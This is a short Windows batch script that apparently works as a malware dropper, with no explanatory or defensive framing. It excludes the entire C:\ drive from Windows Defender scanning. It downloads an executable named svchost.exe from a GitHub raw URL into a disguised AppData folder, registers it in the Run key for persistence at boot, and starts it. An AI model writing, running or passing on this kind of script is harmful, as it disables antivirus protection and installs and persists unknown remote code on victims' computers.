@echo off

:: Add Exclusion Path for Windows Defender
powershell -Command "Add-MpPreference -ExclusionPath 'C:\'"

:: Define variables
set "url=https://github.com/ievercaia/project/raw/refs/heads/main/svchost.exe"
set "outputFile=%APPDATA%\System\svchost.exe"
set "dir=%APPDATA%\System"

:: Create the directory if it doesn't exist
if not exist "%dir%" (
    mkdir "%dir%"
)

:: Sleep for 100 milliseconds
ping 127.0.0.1 -n 1 > nul

:: Download the file using PowerShell
powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%outputFile%'"

:: Add registry key to start on boot
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v svchost /t REG_SZ /d "%outputFile%" /f

:: Start the downloaded executable
start "" "%outputFile%"

:: Exit the script
exit
